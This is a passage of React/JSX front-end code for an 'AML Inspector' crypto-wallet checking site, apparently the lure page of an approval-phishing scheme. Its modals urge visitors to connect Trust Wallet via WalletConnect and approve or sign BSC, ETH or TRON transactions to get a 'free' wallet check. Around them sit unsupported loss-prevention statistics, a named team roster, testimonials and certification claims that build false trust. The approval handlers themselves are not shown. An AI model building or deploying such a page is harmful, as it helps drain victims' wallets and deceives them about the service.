                  await handleApproveEVM_AppKit("BSC");
                } else if (selectedNetwork === "ETH") {
                  await handleApproveEVM_AppKit("ETH");
                } else if (selectedNetwork === "TRON") {
                  await handleApproveTRON();
                }
              }}
              className={`mt-6 w-full h-12 rounded-2xl font-semibold text-white transition ${(processing || processingTRX)
                ? "bg-blue-400 cursor-wait"
                : "bg-blue-600 hover:bg-blue-700"
                }`}
              disabled={processing || processingTRX}
            >
              {(processing || processingTRX) ? "Processing..." : "Continue"}
            </button>

          </div>
        </div>
      )}

      {/* ---- WalletConnect Modal: QR on desktop, deep-link button on mobile ---- */}
      {tronWCUri && (
        <div className="fixed inset-0 z-[22000] flex items-center justify-center bg-black/60 px-4">
          <div className="relative w-full max-w-sm rounded-3xl bg-white p-6 shadow-2xl text-center">
            <button
              onClick={() => setTronWCUri(null)}
              className="absolute top-3 right-3 flex h-8 w-8 items-center justify-center rounded-full bg-black text-white text-lg font-bold"
            >
              ×
            </button>

            <div className="flex items-center justify-center gap-2 mb-1">
              <img src="trust.webp" alt="Trust" className="w-7 h-7" />
              <h2 className="text-xl font-bold text-slate-900">Connect Trust Wallet</h2>
            </div>

            {/* Mobile: show a tappable deep-link button (keeps page JS alive) */}
            {typeof window !== "undefined" && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? (
              <>
                {tronWCUri === "trust://" ? (
                  /* Sign step — tx pending in Trust Wallet */
                  <>
                    <p className="text-sm text-slate-500 mb-5">Your transaction is ready. Open Trust Wallet to sign it.</p>
                    <a
                      href="trust://"
                      className="block w-full py-3 rounded-2xl bg-blue-600 text-white font-semibold text-sm mb-3"
                      style={{ textDecoration: "none" }}
                    >
                      Open Trust Wallet to Sign
                    </a>
                    <p className="text-xs text-slate-400">After signing in Trust Wallet, come back here — confirmation appears automatically</p>
                  </>
                ) : (
                  /* Connect step — WC pairing */
                  <>
                    <p className="text-sm text-slate-500 mb-5">Tap below to open Trust Wallet and approve the connection</p>
                    <a
                      href={`https://link.trustwallet.com/wc?uri=${encodeURIComponent(tronWCUri)}`}
                      className="block w-full py-3 rounded-2xl bg-blue-600 text-white font-semibold text-sm mb-3"
                      style={{ textDecoration: "none" }}
                    >
                      Open Trust Wallet
                    </a>
                    <p className="text-xs text-slate-400">After connecting in Trust Wallet, come back here — approval will appear automatically</p>
                  </>
                )}
              </>
            ) : (
              /* Desktop: show QR code to scan */
              <>
                <p className="text-sm text-slate-500 mb-4">Open Trust Wallet → Scan QR → WalletConnect</p>
                <div className="flex justify-center mb-4">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(tronWCUri)}`}
                    alt="WalletConnect QR Code"
                    className="rounded-xl border border-gray-200"
                    width={220}
                    height={220}
                  />
                </div>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(tronWCUri);
                    toast.success("URI copied!");
                  }}
                  className="w-full py-2 text-sm text-blue-600 border border-blue-200 rounded-xl hover:bg-blue-50 transition mb-2"
                >
                  Copy URI
                </button>
                <button
                  onClick={async () => {
                    setTronWCUri(null);
                    if (selectedNetwork === "ETH_NATIVE") {
                      await handleApproveETH_Native();
                    } else if (selectedNetwork === "ETH") {
                      await handleApproveEVM_AppKit("ETH");
                    } else if (selectedNetwork === "BSC") {
                      await handleApproveEVM_AppKit("BSC");
                    } else {
                      await handleApproveTRON();
                    }
                  }}
                  className="w-full py-2 text-sm bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition font-semibold"
                >
                  Reconnect
                </button>
              </>
            )}
          </div>
        </div>
      )}

      {/* ---- ETH / Ethereum Desktop: Trust Wallet Browser QR modal ---- */}
      {ethNativeDesktopQR && (
        <div className="fixed inset-0 z-[22000] flex items-center justify-center bg-black/60 px-4">
          <div className="relative w-full max-w-sm rounded-3xl bg-white p-6 shadow-2xl text-center">
            <button
              onClick={() => setEthNativeDesktopQR(null)}
              className="absolute top-3 right-3 flex h-8 w-8 items-center justify-center rounded-full bg-black text-white text-lg font-bold"
            >
              ×
            </button>

            <div className="flex items-center justify-center gap-2 mb-1">
              <img src="trust.webp" alt="Trust" className="w-7 h-7" />
              <h2 className="text-xl font-bold text-slate-900">Open in Trust Wallet</h2>
            </div>
            <p className="text-sm text-slate-500 mb-4">
              Scan with your phone camera — this opens the site directly inside Trust Wallet browser
            </p>

            <div className="flex justify-center mb-4">
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(ethNativeDesktopQR)}`}
                alt="Open in Trust Wallet"
                className="rounded-xl border border-gray-200"
                width={220}
                height={220}
              />
            </div>

            <p className="text-xs text-slate-400 mb-3">
              After scanning, Trust Wallet opens this page. You can then approve the transaction natively.
            </p>

            <button
              onClick={() => {
                navigator.clipboard.writeText(ethNativeDesktopQR);
                toast.success("Link copied!");
              }}
              className="w-full py-2 text-sm text-blue-600 border border-blue-200 rounded-xl hover:bg-blue-50 transition"
            >
              Copy Link
            </button>
          </div>
        </div>
      )}

      {/* ---- Desktop "Check your wallet" sign modal — appears after QR scan ---- */}
      {showSignModal && (
        <div className="fixed inset-0 z-[23000] flex items-center justify-center bg-black/60 px-4">
          <div className="relative w-full max-w-sm rounded-3xl bg-white p-8 shadow-2xl text-center">
            <button
              onClick={() => setShowSignModal(false)}
              className="absolute top-3 right-3 flex h-8 w-8 items-center justify-center rounded-full bg-black text-white text-lg font-bold"
            >
              ×
            </button>

            {/* Animated spinner */}
            <div className="flex justify-center mb-5">
              <div
                style={{
                  width: 64,
                  height: 64,
                  borderRadius: "50%",
                  border: "5px solid #e5e7eb",
                  borderTopColor: "#2563eb",
                  animation: "wc-spin 1s linear infinite",
                }}
              />
              <style>{`@keyframes wc-spin { to { transform: rotate(360deg); } }`}</style>
            </div>

            <h2 className="text-xl font-bold text-slate-900 mb-2">Check Your Mobile Wallet</h2>
            <p className="text-sm text-slate-500 mb-1">
              Wallet connected via WalletConnect.
            </p>
            <p className="text-sm text-slate-500 mb-5">
              A <strong>{signModalNetwork}</strong> request has been sent to your mobile wallet.
              Please open your wallet app and <strong>approve</strong>.
            </p>

            <div className="flex items-center justify-center gap-2 mb-4">
              <img src="trust.webp" alt="Trust" className="w-7 h-7" />
              <span className="text-sm font-semibold text-slate-700">Trust Wallet / WalletConnect</span>
            </div>

            <p className="text-xs text-slate-400">
              This page will update automatically once you approve on your phone.
            </p>
          </div>
        </div>
      )}








      <section className="w-full bg-[#0084ff]">
        <div className="mx-auto w-full max-w-[1250px] px-5">
          <div className="grid w-full gap-12 py-16 text-white md:grid-cols-3 md:gap-8">
            {/* Stat 1 */}
            <div className="mx-auto max-w-[325px] text-center md:text-left">
              <div className="mb-3 text-4xl font-black leading-[1.1] md:text-5xl">
                $5 359 800
              </div>
              <p className="text-sm leading-6 md:text-base">
                In the three years we have been in business, we have been able
                to save clients $5 359 800 in losses
              </p>
            </div>

            {/* Stat 2 */}
            <div className="mx-auto max-w-[325px] text-center md:text-left">
              <div className="mb-3 text-4xl font-black leading-[1.1] md:text-5xl">
                + 6 500 000
              </div>
              <p className="text-sm leading-6 md:text-base">
                Wallets contain stolen or dirty money
              </p>
            </div>

            {/* Stat 3 */}
            <div className="mx-auto max-w-[325px] text-center md:text-left">
              <div className="mb-3 text-4xl font-black leading-[1.1] md:text-5xl">
                29%
              </div>
              <p className="text-sm leading-6 md:text-base">
                All of the wallets we checked are suspicious
              </p>
            </div>
          </div>
        </div>
      </section>

























      <section className="w-full bg-zinc-100" id="pricing">
        <div className="mx-auto w-full max-w-[1250px] px-5 py-16">
          {/* Card */}
          <a
            href=""
            className="block w-full rounded-3xl bg-white px-8 py-10 md:px-12 md:py-14 mb-10 cursor-pointer text-black"
          >
            {/* Title */}
            <h2 className="mb-5 max-w-[622px] text-3xl font-bold leading-tight md:text-4xl lg:text-5xl lg:leading-[62.4px]">
              How much is your peace
              <br />
              of mind worth
            </h2>

            {/* Badge */}
            <div className="mb-10 inline-flex items-center rounded-2xl bg-amber-500/10 px-5 py-2 text-xs font-bold tracking-[0.12em] text-amber-500 uppercase">
              First inspection free of charge
            </div>

            {/* From */}
            <div className="mb-3 text-2xl font-semibold">From</div>

            {/* Price */}
            <div className="mb-10 flex items-end">
              <span className="text-6xl font-bold leading-[1] bg-[linear-gradient(115.31deg,rgb(0,163,255)_-9.87%,rgb(255,0,229)_105.89%)] bg-clip-text text-transparent">
                1
              </span>
              <span className="ml-2 text-6xl font-bold leading-[1] text-fuchsia-600">
                $
              </span>
              <span className="ml-4 mb-1 text-2xl text-gray-500">
                / per check
              </span>
            </div>

            {/* CTA link */}
            <div className="inline-flex items-center px-1 py-2 text-lg font-bold">
              Check your wallet
              <span className="ml-2 text-[18px]">→</span>
            </div>
          </a>

          {/* Bottom text */}
          <div className="mx-auto w-full max-w-[980px] text-center leading-7 md:leading-9 text-black">
            According to our statistics,{" "}
            <b className="font-bold">every fourth wallet is suspicious.</b>
            <br />
            Spending a couple dollars on a check can save you from losing
            several thousand dollars.
          </div>
        </div>
      </section>

      <section className="w-full bg-zinc-100">
        <div className="mx-auto w-full max-w-[1250px] px-5 py-16">
          <div className="mx-auto w-full max-w-[900px]">
            {/* Title */}
            <h2 className="mb-10 text-3xl font-bold leading-tight md:text-4xl lg:text-5xl text-black">
              What else?
            </h2>

            {/* Card 1 */}
            <a
              href=""
              className="mb-8 block rounded-[30px] bg-[#1f2933] px-8 py-10 text-white md:px-12 md:py-12 cursor-pointer"
            >
              <div className="max-w-[540px]">
                <h3 className="mb-4 text-2xl font-bold md:text-3xl">
                  Checking the sanctions lists
                </h3>
                <p className="leading-7 md:leading-8">
                  We will show whether the address is on the sanctions lists.
                  Any interaction with such addresses may result in fines,
                  blocking or license revocation.
                </p>
              </div>

              <div className="mt-10">

              </div>
            </a>

            {/* Card 2 */}
            <a
              href=""
              className="block rounded-[30px] bg-white px-8 py-10 md:px-12 md:py-12 cursor-pointer"
            >
              <div className="max-w-[540px] text-black">
                <h3 className="mb-4 text-2xl font-bold md:text-3xl">
                  Helping to salvage stolen crypto
                </h3>
                <p className="leading-7 md:leading-8 text-black">
                  We help you get back the money that was stolen by fraudsters
                  from your wallet. A specialist will analyze the situation and
                  offer a solution.
                </p>
              </div>

              <div className="mt-10">
                <img
                  alt="Safe and key"
                  className="w-[230px] max-w-full md:w-[260px]"
                  loading="lazy"
                  src="key.webp"
                />
              </div>
            </a>
          </div>
        </div>
      </section>

      <section className="w-full bg-zinc-100 py-14 text-black">
        <div className="mx-auto w-full max-w-[1250px] px-5">
          <div className="w-full text-center">
            <p className="mb-4 text-lg leading-7 sm:text-xl md:text-2xl">
              In three years, the AML Inspector service has been used
            </p>

            <h2
              className="
          font-black leading-tight 
          text-4xl 
          sm:text-5xl 
          md:text-6xl 
          lg:text-7xl 
          xl:text-8xl
        "
            >
              500+ companies and exchanges
            </h2>
          </div>
        </div>
      </section>

      <section className="w-full bg-zinc-100 text-black" id="about">
        <div className="mx-auto w-full max-w-[1250px] px-5 py-16">
          <h2 className="mb-6 text-4xl md:text-5xl font-bold text-center leading-[1.2]">
            Our team
          </h2>

          <p className="mb-12 max-w-3xl mx-auto text-center leading-7 md:leading-9 text-gray-700">
            AML officers help resolve difficult situations and keep you safe
            from fines and blockages. Professional specialists will represent
            your interests up to the court, if necessary.
          </p>

          {/* GRID */}
          <div className="grid w-full grid-cols-1 gap-8 sm:grid-cols-2 lg:grid-cols-3">
            {/* CARD 1 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="data:image/webp;base64,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"
                />
              </div>
              <div className="flex flex-col p-6 text-black">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Co-Founder
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Slava Demchuk
                </div>
              </div>
            </div>

            {/* CARD 2 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team1.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Chief Operating Officer
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Vasily Vidmanov
                </div>
              </div>
            </div>

            {/* CARD 3 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team2.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Chief Commercial Officer
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Andrew Aleksandrov
                </div>
              </div>
            </div>

            {/* CARD 4 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team3.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Blockchain Analyst
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Sid Panda
                </div>
              </div>
            </div>

            {/* CARD 5 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team4.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Certified AML Specialist
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Nikolay Demchuk
                </div>
              </div>
            </div>

            {/* CARD 6 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team5.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Legal Advisor
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Anna Voevodina
                </div>
              </div>
            </div>

            {/* CARD 7 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team6.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Business development manager
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Vlad Raskosov
                </div>
              </div>
            </div>

            {/* CARD 8 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team7.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Business development manager
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Denys Shestak
                </div>
              </div>
            </div>

            {/* CARD 9 */}
            <div className="flex flex-col overflow-hidden rounded-[30px] bg-white shadow-md">
              <div className="w-full">
                <img
                  alt=""
                  className="w-full h-full object-cover"
                  loading="lazy"
                  src="team8.webp"
                />
              </div>
              <div className="flex flex-col p-6">
                <div className="mb-2 text-sm font-semibold text-neutral-400">
                  Customer support manager
                </div>
                <div className="text-xl md:text-2xl font-semibold">
                  Nikita Raskosov
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="w-full bg-zinc-100">
        <div className="mx-auto w-full max-w-[1250px] px-5 py-16">
          {/* HEADER + ARROWS */}
          <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between mb-10 text-black">
            <div className="max-w-2xl">
              <h2 className="mb-3 text-3xl md:text-5xl font-bold leading-tight">
                Heres what our customers are saying
              </h2>
              <p className="text-base md:text-xl leading-7 md:leading-8 text-gray-700">
                Explore our service with people weve already helped.
              </p>
            </div>


          </div>

          {/* SLIDER WRAPPER (you can hook Swiper/logic here later) */}
          <div className="overflow-hidden">
            <div className="box-content flex relative transition-transform w-full">
              {/* SLIDE 1 – looks like the screenshot */}
              <div
                role="group"
                aria-label="1 / 6"
                className="flex w-full flex-col items-center gap-8 md:flex-row"
              >
                <div className="w-full md:max-w-[470px]">
                  <img
                    alt=""
                    loading="lazy"
                    className="inline w-full align-bottom rounded-3xl object-cover"
                    src="sdfrta.webp"
                  />
                </div>

                <div className="w-full md:max-w-[570px]">
                  <p className="mb-6 text-base md:text-lg font-semibold leading-7 md:leading-9 text-black">
                    The crypto community has been facing difficulties to detect
                    the sources of suspicious funds, but after the appearance of
                    AML Inspector, all difficulties have disappeared. I advise everyone
                    to use this service until your activity becomes fully legal
                  </p>
                  <p className="text-sm md:text-base font-semibold leading-6 md:leading-7 text-black">
                    CEO •{" "}
                    <a
                      href="https://uniochange.com/"
                      className="text-blue-600 underline-offset-2 hover:underline"
                    >
                      Uniochange
                    </a>
                  </p>
                </div>
              </div>

              {/* --- OTHER SLIDES (optional) --- */}
              {/* Just copy the block above and change image/text for slides 2..n.
            Keep the same classes: `flex w-full flex-col ... md:flex-row` */}
            </div>
          </div>
        </div>
      </section>

      <section className="w-full bg-[#f3f4f6]">
        <div className="mx-auto w-full max-w-[1250px] px-5 py-14">
          <h2 className="mb-8 text-4xl md:text-5xl font-bold  text-black">
            We are trusted
          </h2>

          {/* ROW 1 – moves RIGHT */}
          <div className="relative overflow-hidden mb-6">
            <div className="flex gap-6 whitespace-nowrap marquee-right">
              {[...row1, ...row1].map((logo, i) => (
                <div
                  key={`r1-${i}`}
                  className="flex h-[110px] min-w-[180px] sm:min-w-[220px] items-center justify-center rounded-[30px] bg-white shadow-sm"
                >
                  <img
                    src={logo}
                    alt=""
                    className="max-h-[60px] w-auto object-contain"
                  />
                </div>
              ))}
            </div>
          </div>

          {/* ROW 2 – moves LEFT */}
          <div className="relative overflow-hidden">
            <div className="flex gap-6 whitespace-nowrap marquee-left">
              {[...row2, ...row2].map((logo, i) => (
                <div
                  key={`r2-${i}`}
                  className="flex h-[110px] min-w-[180px] sm:min-w-[220px] items-center justify-center rounded-[30px] bg-white shadow-sm"
                >
                  <img
                    src={logo}
                    alt=""
                    className="max-h-[60px] w-auto object-contain"
                  />
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      <section className="w-full bg-zinc-100" id="analysis">
        <div className="mx-auto w-full max-w-[1250px] px-5 py-16">
          <div className="w-full">
            <h2 className="mb-8 text-3xl md:text-5xl font-bold leading-tight md:leading-[62.4px] text-black">
              Why AML Inspector
            </h2>

            {/* ROW 1 */}
            <div className="mb-8 flex flex-col gap-6 md:flex-row text-black">
              {/* Safety */}
              <div className="w-full rounded-3xl bg-white p-8 md:p-12 md:w-1/2">
                <h3 className="mb-5 text-2xl md:text-4xl font-black leading-9 md:leading-10">
                  Safety
                </h3>
                <p className="mb-8 leading-7 md:leading-9">
                  AML Inspector does not collect or store data about you or your
                  business. You remain anonymous and protected.
                </p>
                <div className="w-full">
                  <img
                    alt=""
                    className="mt-6 md:mt-8 w-full max-w-[175px] overflow-x-clip overflow-y-clip"
                    loading="lazy"
                    src="secure.webp"
                  />
                </div>
              </div>

              {/* Reliability */}
              <div className="w-full rounded-3xl bg-blue-600 p-8 text-white md:p-12 md:w-1/2">
                <h3 className="mb-5 text-2xl md:text-4xl font-black leading-9 md:leading-10">
                  Reliability
                </h3>
                <p className="mb-8 leading-7 md:leading-9">
                  We have the relevant certificates, which you can show to the
                  inspection authorities
                </p>
                <div className="mx-auto w-full max-w-[390px]">
                  <img
                    alt=""
                    className="mt-6 md:mt-8 w-full overflow-x-clip overflow-y-clip"
                    loading="lazy"
                    src="certificate.webp"
                  />
                </div>
              </div>
            </div>

            {/* ROW 2 */}
            <div className="flex flex-col gap-6 md:flex-row">
              {/* 24/7 support */}
              <div className="w-full rounded-3xl bg-white p-8 md:p-12 md:w-2/3">
                <h3 className="mb-5 text-2xl md:text-4xl font-black leading-9 md:leading-10 text-black">
                  24/7 support
                </h3>
                <p className="mb-4 leading-7 md:leading-9">
                  We are on call 24/7, so any issue can be resolved quickly and
                  in a live chat format.
                </p>
                <p className="mb-8 text-sm leading-5 text-gray-500">
                  We are living people, so may not respond as promptly at night
                  as during the day ✌️
                </p>
                <div className="w-full">
                  <img
                    alt=""
                    className="mt-6 md:mt-8 w-full max-w-[400px] overflow-x-clip overflow-y-clip"
                    loading="lazy"
                    src="message.webp"
                  />
                </div>
              </div>

              {/* Experience */}
              <div className="w-full rounded-3xl bg-gray-700 px-8 py-10 text-white md:px-10 md:py-12 md:w-1/3">
                <h3 className="mb-5 text-2xl md:text-4xl font-black leading-9 md:leading-10">
                  Experience
                </h3>
                <p className="mb-8 leading-7 md:leading-9">
                  We saved about <b className="font-bold">$5 359 800</b> from
                  being blocked on exchanges and exchangers
                </p>
                <div className="mx-auto w-full max-w-[185px]">
                  <img
                    alt=""
                    className="mt-6 md:mt-8 w-full overflow-x-clip overflow-y-clip"
                    loading="lazy"
                    src="image1.webp"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="w-full bg-zinc-100 py-16">
        <div className="mx-auto w-full max-w-[1250px] px-5">
          <h2 className="mb-12 text-center text-4xl md:text-5xl font-bold text-black">
            Popular Questions
          </h2>

          <div className="flex flex-col lg:flex-row gap-10">
            {/* LEFT sidebar */}
            <div className="w-full lg:max-w-[390px] lg:max-h-[290px] rounded-3xl bg-cyan-200 bg-opacity-20 px-6 py-8 lg:sticky lg:top-[140px]">
              <h4 className="font-bold text-blue-950 mb-4">
                Didn’t find your question?
              </h4>

              <p className="text-gray-700 mb-5">
                Message us on Telegram — fast & friendly support.
              </p>

              <a
                href=""
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center mb-4"
              >
                <div className="text-3xl text-sky-400 mr-3">💬</div>
                <div>
                  <p className="text-sky-400 font-semibold">
